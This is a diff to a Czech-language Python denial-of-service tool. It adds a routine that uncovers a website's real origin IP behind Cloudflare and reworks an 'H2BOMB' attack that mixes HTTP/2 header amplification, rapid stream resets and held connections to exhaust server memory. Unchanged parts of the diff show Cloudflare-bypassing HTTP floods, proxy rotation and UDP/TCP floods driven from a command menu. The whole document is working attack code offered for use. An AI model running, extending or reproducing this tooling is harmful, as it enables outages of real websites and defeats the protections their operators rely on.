@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 from os import system, name
-import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
+import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx, re
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
@@ -20,7 +20,6 @@ try:
 except ImportError:
     HAS_TLS_CLIENT = False
 
-# HTTP/2 knihovna pro h2bomb
 try:
     import h2.connection
     import h2.config
@@ -29,13 +28,19 @@ try:
 except ImportError:
     HAS_H2 = False
 
+try:
+    import dns.resolver
+    HAS_DNSPYTHON = True
+except ImportError:
+    HAS_DNSPYTHON = False
+
 
 # ============================================================
 # Globální konfigurace
 # ============================================================
 SOCKET_TIMEOUT = 5
 BURST_PER_SOCKET = 50
-H2_BOMB_STREAMS = 200   # počet streamů na jedno připojení
+H2_BOMB_STREAMS = 200
 
 
 def countdown(t):
@@ -204,6 +209,140 @@ def get_info_l4():
     stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
     t = input()
     return target, port, thread, t
+
+
+# ============================================================
+# TOOLKA: Zjištění origin IP za Cloudflare
+# ============================================================
+def _is_cloudflare_ip(ip):
+    try:
+        parts = ip.split(".")
+        if len(parts) != 4:
+            return False
+        a, b = int(parts[0]), int(parts[1])
+        if a == 104 and 16 <= b <= 31: return True
+        if a == 172 and 64 <= b <= 71: return True
+        if a == 188 and b == 114: return True
+        if a == 190 and b == 93: return True
+        if a == 197 and b == 234: return True
+        if a == 198 and b == 41: return True
+        if a == 162 and 158 <= b <= 159: return True
+        if a == 173 and 245 <= b <= 246: return True
+    except Exception:
+        pass
+    return False
+
+
+def find_origin_ip(domain):
+    domain = domain.strip().replace("https://", "").replace("http://", "").split("/")[0]
+    stdout.write(Fore.LIGHTCYAN_EX + f"\n [*] Hledám origin IP pro: {domain}\n")
+    stdout.write(Fore.WHITE + " " + "-" * 60 + "\n")
+
+    found_ips = set()
+
+    # 1) Běžné subdomény
+    stdout.write(Fore.LIGHTCYAN_EX + " [1/5] " + Fore.WHITE + "Zkouším běžné subdomény...\n")
+    common_subs = ["mail", "ftp", "cpanel", "webmail", "direct", "origin",
+                   "server", "host", "vpn", "dev", "staging", "portal", "remote"]
+    for sub in common_subs:
+        try:
+            ips = socket.gethostbyname_ex(f"{sub}.{domain}")[2]
+            for ip in ips:
+                if not _is_cloudflare_ip(ip):
+                    stdout.write(Fore.LIGHTGREEN_EX + f"    [OK] {sub}.{domain} -> {ip}\n")
+                    found_ips.add(ip)
+        except Exception:
+            pass
+
+    # 2) SPF záznamy
+    stdout.write(Fore.LIGHTCYAN_EX + " [2/5] " + Fore.WHITE + "Kontroluji SPF záznamy...\n")
+    if HAS_DNSPYTHON:
+        try:
+            answers = dns.resolver.resolve(domain, 'TXT')
+            for rdata in answers:
+                txt = str(rdata)
+                if "v=spf1" in txt:
+                    ips = re.findall(r'ip4:([0-9.]+)', txt)
+                    for ip in ips:
+                        if not _is_cloudflare_ip(ip):
+                            stdout.write(Fore.LIGHTGREEN_EX + f"    [OK] SPF -> {ip}\n")
+                            found_ips.add(ip)
+        except Exception:
+            pass
+    else:
+        stdout.write(Fore.MAGENTA + "    [!] dnspython chybí (pip install dnspython)\n")
+
+    # 3) MX záznamy
+    stdout.write(Fore.LIGHTCYAN_EX + " [3/5] " + Fore.WHITE + "Kontroluji MX záznamy...\n")
+    if HAS_DNSPYTHON:
+        try:
+            answers = dns.resolver.resolve(domain, 'MX')
+            for rdata in answers:
+                mx_host = str(rdata.exchange).rstrip('.')
+                try:
+                    ips = socket.gethostbyname_ex(mx_host)[2]
+                    for ip in ips:
+                        if not _is_cloudflare_ip(ip):
+                            stdout.write(Fore.LIGHTGREEN_EX + f"    [OK] MX {mx_host} -> {ip}\n")
+                            found_ips.add(ip)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    # 4) Certificate Transparency
+    stdout.write(Fore.LIGHTCYAN_EX + " [4/5] " + Fore.WHITE + "Prohledávám Certificate Transparency (crt.sh)...\n")
+    try:
+        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=30)
+        if r.status_code == 200:
+            data = r.json()
+            subdomains = set()
+            for entry in data:
+                for nm in entry.get("name_value", "").split("\n"):
+                    nm = nm.strip().lstrip("*.")
+                    if nm.endswith(domain):
+                        subdomains.add(nm)
+            stdout.write(Fore.WHITE + f"    [*] Nalezeno {len(subdomains)} subdomén v CT logech\n")
+            for sub in list(subdomains)[:50]:
+                try:
+                    ips = socket.gethostbyname_ex(sub)[2]
+                    for ip in ips:
+                        if not _is_cloudflare_ip(ip):
+                            stdout.write(Fore.LIGHTGREEN_EX + f"    [OK] {sub} -> {ip}\n")
+                            found_ips.add(ip)
+                except Exception:
+                    pass
+    except Exception as e:
+        stdout.write(Fore.MAGENTA + f"    [!] crt.sh selhalo: {e}\n")
+
+    # 5) Ověření kandidátů
+    stdout.write(Fore.LIGHTCYAN_EX + " [5/5] " + Fore.WHITE + "Ověřuji kandidáty (Host header probe)...\n")
+    verified = []
+    for ip in list(found_ips)[:20]:
+        try:
+            r = requests.get(
+                f"http://{ip}",
+                headers={"Host": domain},
+                timeout=5,
+                allow_redirects=False,
+            )
+            if r.status_code in (200, 301, 302, 403):
+                stdout.write(Fore.LIGHTGREEN_EX + f"    [CONFIRMED] {ip} (HTTP {r.status_code})\n")
+                verified.append(ip)
+        except Exception:
+            pass
+
+    stdout.write(Fore.WHITE + " " + "-" * 60 + "\n")
+    if verified:
+        stdout.write(Fore.LIGHTGREEN_EX + f" [✓] Potvrzené origin IP ({len(verified)}):\n")
+        for ip in verified:
+            stdout.write(Fore.LIGHTGREEN_EX + f"     -> {ip}\n")
+    elif found_ips:
+        stdout.write(Fore.MAGENTA + f" [!] Kandidáti (neověřeno): {', '.join(list(found_ips)[:10])}\n")
+    else:
+        stdout.write(Fore.MAGENTA + " [!] Žádná origin IP nenalezena (dobře zabezpečeno).\n")
+    stdout.write("\n")
+    return verified if verified else list(found_ips)
 
 
 # ============================================================
@@ -477,14 +616,9 @@ def AttackPXSPOOF(target, until_datetime, req):
 
 
 # ============================================================
-# NOVÁ METODA: H2BOMB (HTTP/2 Bomb + MadeYouReset)
+# H2BOMB
 # ============================================================
 def LaunchH2BOMB(url, th, t, use_proxy=False):
-    """
-    HTTP/2 Bomb + MadeYouReset.
-    Kombinuje HPACK amplifikaci a flow-control hold pro maximalni
-    vycerpani pameti serveru. Kazde vlakno otevre N streamu a drzi je.
-    """
     if not HAS_H2:
         stdout.write(Fore.RED + "[!]" + Fore.WHITE + " h2 neni nainstalovano. pip install h2\n")
         return
@@ -494,18 +628,14 @@ def LaunchH2BOMB(url, th, t, use_proxy=False):
     def worker():
         while (until - datetime.datetime.now()).total_seconds() > 0:
             try:
-                # Vytvorit TCP/TLS spojeni (pres proxy nebo direct)
                 if use_proxy:
                     p = random.choice(proxies)
                     raw_sock = make_socks5_socket(p, target, use_ssl=False)
-                    if raw_sock is None:
-                        continue
+                    if raw_sock is None: continue
                 else:
                     raw_sock = make_direct_socket(target, use_ssl=False)
-                    if raw_sock is None:
-                        continue
+                    if raw_sock is None: continue
 
-                # TLS handshake
                 if target['scheme'] == 'https':
                     ctx = ssl.create_default_context()
                     ctx.check_hostname = False
@@ -514,23 +644,16 @@ def LaunchH2BOMB(url, th, t, use_proxy=False):
                 else:
                     sock = raw_sock
 
-                # HTTP/2 handshake
                 config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
                 conn = h2.connection.H2Connection(config=config)
                 conn.initiate_connection()
                 sock.sendall(conn.data_to_send())
 
-                # HPACK bomb: jeden velky header, ktery se opakuje
-                # malymi indexy (1 bajt na referenci)
                 bomb_value = "A" * 4096
                 stream_id = 1
-
-                # Odeslat N streamu, kazdy s referenci na bombu
                 for i in range(H2_BOMB_STREAMS):
-                    if (until - datetime.datetime.now()).total_seconds() <= 0:
-                        break
+                    if (until - datetime.datetime.now()).total_seconds() <= 0: break
                     try:
-                        # Poslat HEADERS s velkym headerem
                         conn.send_headers(
                             stream_id,
                             [
@@ -539,24 +662,21 @@ def LaunchH2BOMB(url, th, t, use_proxy=False):
                                 (':authority', target['host']),
                                 (':scheme', target['scheme']),
                                 ('user-agent', random.choice(ua)),
-                                ('x-bomb', bomb_value),  # HPACK reference
+                                ('x-bomb', bomb_value),
                             ],
                             end_stream=False
                         )
-                        # Okamzity reset -> MadeYouReset princip
                         conn.reset_stream(stream_id)
                         sock.sendall(conn.data_to_send())
                         stream_id += 2
                     except Exception:
                         break
 
-                # Drzet spojeni otevrene (Slowloris flow-control hold)
-                # Tim zabranime uvolneni pameti na serveru
                 hold_until = time.time() + 5
                 while time.time() < hold_until and (until - datetime.datetime.now()).total_seconds() > 0:
                     try:
                         sock.settimeout(1)
-                        sock.recv(1)  # cekame na WINDOW_UPDATE
+                        sock.recv(1)
                     except socket.timeout:
                         pass
                     except Exception:
@@ -569,12 +689,11 @@ def LaunchH2BOMB(url, th, t, use_proxy=False):
 
     for _ in range(int(th)):
         thd = threading.Thread(target=worker)
-        thd.daemon = True
-        thd.start()
+        thd.daemon = True; thd.start()
 
 
 # ============================================================
-# CF metody – cloudscraper
+# CF metody
 # ============================================================
 def LaunchCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -615,9 +734,6 @@ def AttackPXCFB(url, until_datetime, scraper):
         except Exception: pass
 
 
-# ============================================================
-# CF metody – curl_cffi
-# ============================================================
 def LaunchCFFI(url, th, t):
     if not HAS_CURL_CFFI:
         stdout.write(Fore.RED + "[!]" + Fore.WHITE + " curl_cffi neni nainstalovano\n")
@@ -658,20 +774,17 @@ def AttackPXCFFI(url, until_datetime):
         try:
             p = random.choice(proxies)
             proxy_url = proxy_to_url(p)
-            proxies = {"http": proxy_url, "https": proxy_url}
+            proxies_dict = {"http": proxy_url, "https": proxy_url}
             ua_choice = random.choice(ua)
             curl_requests.get(url, impersonate="chrome120",
                               headers={"User-Agent": ua_choice},
-                              proxies=proxies, timeout=SOCKET_TIMEOUT)
+                              proxies=proxies_dict, timeout=SOCKET_TIMEOUT)
             curl_requests.get(url, impersonate="chrome120",
                               headers={"User-Agent": ua_choice},
-                              proxies=proxies, timeout=SOCKET_TIMEOUT)
+                              proxies=proxies_dict, timeout=SOCKET_TIMEOUT)
         except Exception: pass
 
 
-# ============================================================
-# CF metody – tls_client
-# ============================================================
 def LaunchTLSC(url, th, t):
     if not HAS_TLS_CLIENT:
         stdout.write(Fore.RED + "[!]" + Fore.WHITE + " tls_client neni nainstalovano\n")
@@ -719,7 +832,7 @@ def AttackPXTLSC(url, until_datetime):
 
 
 # ============================================================
-# HTTP/2 metody (puvodni)
+# HTTP/2
 # ============================================================
 def LaunchHTTP2(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -860,12 +973,13 @@ def help():
     stdout.write("  pxraw, pxsoc, pxspoof, pxsky, pxhttp2 (s proxy)\n")
     stdout.write(Fore.LIGHTCYAN_EX + "\nCloudflare:\n" + Fore.WHITE)
     stdout.write("  cfb, pxcfb, cffi, pxcffi, tlsc, pxtlsc\n")
-    stdout.write(Fore.RED + "\nH2BOMB (NOVE - nejsilnejsi):\n" + Fore.WHITE)
+    stdout.write(Fore.RED + "\nH2BOMB (nejsilnejsi):\n" + Fore.WHITE)
     stdout.write("  h2bomb       - HTTP/2 Bomb (bez proxy)\n")
     stdout.write("  pxh2bomb     - HTTP/2 Bomb (s proxy)\n")
     stdout.write(Fore.LIGHTCYAN_EX + "\nLayer 4:\n" + Fore.WHITE)
     stdout.write("  udp, tcp\n")
     stdout.write(Fore.LIGHTCYAN_EX + "\nTools:\n" + Fore.WHITE)
+    stdout.write("  origin    - Najdi origin IP za Cloudflare\n")
     stdout.write("  dns, geoip, subnet, exit\n\n")
 
 
@@ -888,7 +1002,10 @@ def layer4():
 def tools():
     clear()
     stdout.write(Fore.LIGHTWHITE_EX + "\n=== TOOLS ===\n\n")
-    stdout.write(Fore.WHITE + "dns, geoip, subnet\n\n")
+    stdout.write(Fore.WHITE + "origin    - Najdi origin IP za Cloudflare\n")
+    stdout.write("dns       - DNS lookup\n")
+    stdout.write("geoip     - Geo IP\n")
+    stdout.write("subnet    - Subnet\n\n")
 
 
 def command():
@@ -908,7 +1025,6 @@ def command():
     elif cmd == "exit":
         sys.exit()
 
-    # --- bez proxy ---
     elif cmd in ("get", "GET"):
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,)); timer.start()
@@ -942,7 +1058,6 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,)); timer.start()
         LaunchHTTP2(target, thread, t); timer.join()
 
-    # --- s proxy ---
     elif cmd in ("pxraw", "PXRAW"):
         if get_proxies():
             target, thread, t = get_info_l7()
@@ -969,7 +1084,6 @@ def command():
             timer = threading.Thread(target=countdown, args=(t,)); timer.start()
             LaunchPXHTTP2(target, thread, t); timer.join()
 
-    # --- CF ---
     elif cmd in ("cfb", "CFB"):
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,)); timer.start()
@@ -998,7 +1112,6 @@ def command():
             timer = threading.Thread(target=countdown, args=(t,)); timer.start()
             LaunchPXTLSC(target, thread, t); timer.join()
 
-    # --- H2BOMB ---
     elif cmd in ("h2bomb", "H2BOMB"):
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,)); timer.start()
@@ -1009,7 +1122,6 @@ def command():
             timer = threading.Thread(target=countdown, args=(t,)); timer.start()
             LaunchH2BOMB(target, thread, t, use_proxy=True); timer.join()
 
-    # --- Layer 4 ---
     elif cmd in ("udp", "UDP"):
         target, port, thread, t = get_info_l4()
         th = threading.Thread(target=runsender, args=(target, port, t, thread)); th.daemon = True; th.start()
@@ -1019,7 +1131,10 @@ def command():
         th = threading.Thread(target=runflooder, args=(target, port, t, thread)); th.daemon = True; th.start()
         timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
 
-    # --- Tools ---
+    elif cmd == "origin":
+        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "DOMAIN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
+        dom = input().strip()
+        find_origin_ip(dom)
     elif cmd == "subnet":
         stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
         target = input()
@@ -1126,6 +1241,10 @@ if __name__ == '__main__':
         stdout.write(Fore.RED + " [*] " + Fore.WHITE + "h2bomb: OK (HTTP/2 Bomb)\n")
     else:
         stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "h2bomb: CHYBI (pip install h2)\n")
+    if HAS_DNSPYTHON:
+        stdout.write(Fore.LIGHTCYAN_EX + " [*] " + Fore.WHITE + "dnspython: OK (origin tool)\n")
+    else:
+        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "dnspython: CHYBI (pip install dnspython)\n")
     stdout.write("\n")
 
     while True:
